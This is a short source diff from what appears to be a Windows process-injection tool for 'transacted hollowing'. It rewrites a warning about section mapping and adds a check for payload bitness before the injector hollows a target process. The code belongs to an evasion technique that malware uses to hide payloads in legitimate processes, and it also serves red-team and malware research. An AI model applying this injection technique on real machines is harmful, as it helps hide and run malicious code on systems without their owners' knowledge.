@@ -118,7 +118,7 @@ PVOID map_buffer_into_process(HANDLE hProcess, HANDLE hSection)
     if ((status = NtMapViewOfSection(hSection, hProcess, &sectionBaseAddress, NULL, NULL, NULL, &viewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS)
     {
         if (status == STATUS_IMAGE_NOT_AT_BASE) {
-            std::cerr << "[WARNING] Image Not at base\n";
+            std::cerr << "[WARNING] Image could not be mapped at its original base! If the payload has no relocations, it won't work!\n";
         }
         else {
             std::cerr << "[ERROR] NtMapViewOfSection failed, status: " << std::hex << status << std::endl;
@@ -188,6 +188,11 @@ int wmain(int argc, wchar_t *argv[])
     if (payladBuf == NULL) {
         std::cerr << "Cannot read payload!" << std::endl;
         return -1;
+    }
+    bool isPayl32b = !pe_is64bit(payladBuf);
+    if (is32bit && !isPayl32b) {
+        std::cout << "[ERROR] The injector (32 bit) is not compatibile with the payload (64 bit)\n";
+        return 1;
     }
 
     bool is_ok = transacted_hollowing(targetPath, payladBuf, (DWORD) payloadSize);
